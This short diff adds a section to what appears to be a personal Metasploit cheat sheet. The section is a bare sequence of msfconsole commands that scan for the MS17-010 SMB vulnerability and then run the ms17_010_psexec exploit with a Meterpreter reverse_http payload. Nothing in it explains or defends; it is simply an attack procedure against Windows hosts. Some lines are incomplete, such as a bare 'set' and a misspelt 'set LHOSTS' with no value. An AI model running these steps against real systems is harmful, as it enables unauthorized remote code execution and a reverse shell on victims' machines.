@@ -113,3 +113,23 @@ sessions
 sessions -i -1
 
 ```
+
+## Search to see if Vulnerable and then exploit
+
+```
+search smb
+grep scanner search smb
+use auxiliary/scanner/smb/smb_ms17_010
+show options
+run
+
+
+grep exploit search smb
+use exploit/windows/smb/ms17_010_psexec
+show options
+set
+set payload windows/meterpreter/reverse_http
+set LHOSTS
+exploit
+
+```
